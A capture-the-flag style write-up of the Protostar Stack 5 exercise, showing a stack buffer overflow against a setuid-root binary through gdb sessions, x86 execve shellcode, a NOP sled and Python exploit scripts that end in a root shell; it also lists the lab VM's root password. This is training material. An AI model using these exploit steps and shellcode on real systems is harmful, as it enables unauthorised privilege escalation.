## Buffer Overflow - Local Privilege Escalation Exploit

**Stack 5** - [ [Description](https://exploit.education/protostar/stack-five/) ]

source.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Set-uid Permission ( You know what ? )
```c
$ ls -al /opt/protostar/bin/stack5
-rwsr-xr-x 1 root root 22612 Nov 24  2011 /opt/protostar/bin/stack5
```
If you don't know Buffer Overflow , go [Here](https://github.com/LunaM00n/LOL-Pwn/blob/master/Notes/14.Buffer_Overflow_and_Hijack_CF.md).

**Using Pattern Tool for crash point** 

I used [simple python pattern tool](https://github.com/Svenito/exploit-pattern) and you can also use your farvorate. Example - metasploit pattern tool

Pattern Create 100
```c
D:\LOL Pwn>python pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
Using Pattern with gdb
```c
$ gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) break *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) run
Starting program: /opt/protostar/bin/stack5
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41346349
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) i r
eax            0xbffffc70       -1073742736
ecx            0xbffffc70       -1073742736
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffcbc       0xbffffcbc
ebp            0x41346341       0x41346341
esi            0x0      0
edi            0x0      0
eip            0x80483da        0x80483da <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) ni
Cannot access memory at address 0x41346345
(gdb) print $eip
$10 = (void (*)()) 0x63413563
```
Pattern Search
```c
D:\LOL Pwn>python pattern.py 0x63413563
Pattern 0x63413563 first occurrence at position 76 in pattern.
```
**Controlling EIP**
```c
$ python -c 'print "A"*76+"BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

$ gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) break *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) run
Starting program: /opt/protostar/bin/stack5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) ni
Cannot access memory at address 0x41414145
(gdb) print $eip
$1 = (void (*)()) 0x42424242
```
**Shellcode Injection**

[ [x86 execve shellcode](http://shell-storm.org/shellcode/files/shellcode-827.php) ]

```c
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```
Return to Stack
```c
$ python -c 'print "A"*76+"BBBB"+"C"*100'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

$ gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.

(gdb) break *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) run
Starting program: /opt/protostar/bin/stack5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) ni
Cannot access memory at address 0x41414145
(gdb) print $eip
$1 = (void (*)()) 0x42424242
(gdb) x/32x $esp
0xbffffcc0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffcd0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffce0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffcf0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd00:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd10:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffd20:     0x43434343      0xb7ff6200      0xb7eadb9b      0xb7ffeff4
0xbffffd30:     0x00000001      0x08048310      0x00000000      0x08048331
```
- `ret` -> next instruction at the top of the stack `BBBB`
- `0x43434343` -> our `CCCC` at the top of the stack

**Landing the Shellcode**

Payload Idea
```c
A*76 ( JUNK ) + Stack Address ( EIP ) + Shellcode ( Stack )
```
- Stack Address -> `0xbffffcc0`

exploit 0.0
```py
python -c 'print "A"*76+"\xc0\xfc\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'
```
Testing in GDB
```c
$ python -c 'print "A"*76+"\xc0\xfc\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/0

$ gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.

(gdb) break *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) ni
The program is not being run.
(gdb) run < /tmp/0
Starting program: /opt/protostar/bin/stack5 < /tmp/0

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) ni
Cannot access memory at address 0x41414145
(gdb) x/32x $esp
0xbffffcc0:     0x6850c031      0x68732f2f      0x69622f68      0x50e3896e
0xbffffcd0:     0xb0e18953      0x0080cd0b      0xb7ffeff4      0x08048232
0xbffffce0:     0x00000001      0xbffffd20      0xb7ff0626      0xb7fffab0
0xbffffcf0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffffd00:     0xbffffd38      0x4f496fe0      0x650899f0      0x00000000
0xbffffd10:     0x00000000      0x00000000      0x00000001      0x08048310
0xbffffd20:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0xbffffd30:     0x00000001      0x08048310      0x00000000      0x08048331
(gdb) ni
0xbffffcc2 in ?? ()
(gdb)
0xbffffcc3 in ?? ()
(gdb)
0xbffffcc8 in ?? ()
(gdb)
0xbffffccd in ?? ()
(gdb)
0xbffffccf in ?? ()
(gdb)
0xbffffcd0 in ?? ()
(gdb)
0xbffffcd1 in ?? ()
(gdb)
0xbffffcd3 in ?? ()
(gdb)
0xbffffcd5 in ?? ()
(gdb)
Executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.

Program exited normally.
(gdb)
The program is not being run.
(gdb)
The program is not being run.
```
 - Its ok 

Testing outside of gdb

```c
$ python -c 'print "A"*76+"\xc0\xfc\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' | ./stack5
Segmentation fault
```
**NOP Trick** ( More Reliable Shellcode Landing )

> Stack Address may be different between gdb and outside gdb

`nop` = No Operation ( Do Nothing )
`\x90` in Hexadecimal
 
 Payload Idea
```c
A*76 ( JUNK ) + Stack Address ( EIP )  + NOP + Shellcode ( Stack )
```
Landing the middle of NOP

```c
python -c 'print "A"*76+"\xc0\xfc\xff\xbf"+"\x90"*40+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/1

$ gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) break *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x $esp
>x/2i $eip
>end
(gdb) run < /tmp/1
Starting program: /opt/protostar/bin/stack5 < /tmp/1
0xbffffcbc:     0xbffffcc0      0x90909090      0x90909090      0x90909090
0xbffffccc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffcdc:     0x90909090      0x90909090      0x90909090      0x6850c031
0xbffffcec:     0x68732f2f      0x69622f68      0x50e3896e      0xb0e18953
0xbffffcfc:     0x0080cd0b      0xbffffd38      0x625a3ac1      0x481bccd1
0xbffffd0c:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffffd1c:     0x08048310      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffffd2c:     0xb7ffeff4      0x00000001      0x08048310      0x00000000
0x80483da <main+22>:    ret
0x80483db:      nop

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41414149
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
```
- `0xbffffccc` is the middile of NOP

/tmp/exploit0.py

 ( We can't use A*76 here thats why I used pattern from live0verflow ) 
 
```py
import struct
padding="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

EIP = struct.pack("I",0xbffffccc+30)

nop = "\x90"*100
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print(padding+EIP+nop+shellcode)
```
Testing 
```c
#Nothing Happened
python /tmp/exploit1.py | ./stack5

#System call trace
python /tmp/exploit1.py | strace ./stack5

# Called execve() 
execve("/bin//sh", [0], [/* 0 vars */]) = 0

# cat trick ( from live0verflow ) 
$ (python /tmp/exploit1.py;cat;)  |  ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
/tmp/exploit0.py ( A*76 need more NOP )
```c
import struct
padding="A"*76

EIP = struct.pack("I",0xbffffccc+100)

nop = "\x90"*200
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print(padding+EIP+nop+shellcode)
```

**Core File Analysis** [ [Ref](https://embeddedbits.org/linux-core-dump-analysis/) ]

We need root user
```c
username=root
password=godmode
```
change permission for core dumping
```c
root@protostar:/opt/protostar/bin# echo 2 > /proc/sys/fs/suid_dumpable
```
Core dump from user
```c
$ python /tmp/exploit.py | ./stack5
Illegal instruction (core dumped)
$ ls
final0  final2   format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1  format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
$ ls /tmp
0  1  2  core.4.stack5.1967  exploit1.py  exploit.py  exploit.py.save
```
Loading Core file in gdb
```c
root@protostar:/opt/protostar/bin# gdb -q stack5 --core /tmp/core.4.stack5.1967
Reading symbols from /opt/protostar/bin/stack5...done.

warning: Can't read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
Core was generated by `./stack5'.
Program terminated with signal 4, Illegal instruction.
#0  0xbffffd0e in ?? ()
```
Check out the stack
```c
(gdb) x/32x $esp
0xbffffd10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd30:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd40:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd50:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd60:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd70:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
0xbffffd80:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0
```
Change stack address in exploit.py
```c
$ cat /tmp/exploit.py
import struct

padding="A"*76

EIP = struct.pack("I",0xbffffd20)

nop = "\x90"*100
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print(padding+EIP+nop+shellcode)
```
Result ( cat trick from live0verflow )
```c
$ (python /tmp/exploit.py;cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```
